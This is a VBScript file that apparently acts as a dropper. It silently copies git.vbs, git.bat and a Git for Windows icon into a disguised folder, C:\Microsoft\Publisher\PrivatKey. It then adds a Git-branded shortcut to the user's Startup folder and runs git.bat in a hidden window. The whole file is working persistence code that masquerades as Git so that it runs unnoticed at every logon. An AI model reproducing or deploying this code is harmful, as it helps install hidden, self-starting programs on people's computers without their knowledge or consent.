set WshShell     = WScript.CreateObject("WScript.Shell" )
set fso          = WScript.CreateObject("Scripting.FileSystemObject")
strCurDir        = WshShell.CurrentDirectory
appDataLocation  = WshShell.ExpandEnvironmentStrings("%APPDATA%")
set oShellLink   = WshShell.CreateShortcut(appDataLocation + "\Microsoft\Windows\Start Menu\Programs\Startup\git.lnk" )


WshShell.Run "cmd /c mkdir C:\Microsoft\Publisher\PrivatKey", 0,True
WshShell.Run "cmd /c copy git.vbs C:\Microsoft\Publisher\PrivatKey", 0,True
WshShell.Run "cmd /c copy git.bat C:\Microsoft\Publisher\PrivatKey", 0,True
WshShell.Run "cmd /c copy git-for-windows.ico C:\Microsoft\Publisher\PrivatKey", 0,True

oShellLink.TargetPath = "C:\Microsoft\Publisher\PrivatKey\git.vbs"
oShellLink.Arguments = ""
oShellLink.WindowStyle = 7
oShellLink.Description = "Shortcut Script"
oShellLink.WorkingDirectory = "C:\Microsoft\Publisher\PrivatKey\"
oShellLink.IconLocation = "C:\Microsoft\Publisher\PrivatKey\git-for-windows.ico"
oShellLink.Save
WshShell.Run "C:\Microsoft\Publisher\PrivatKey\git.bat",0,True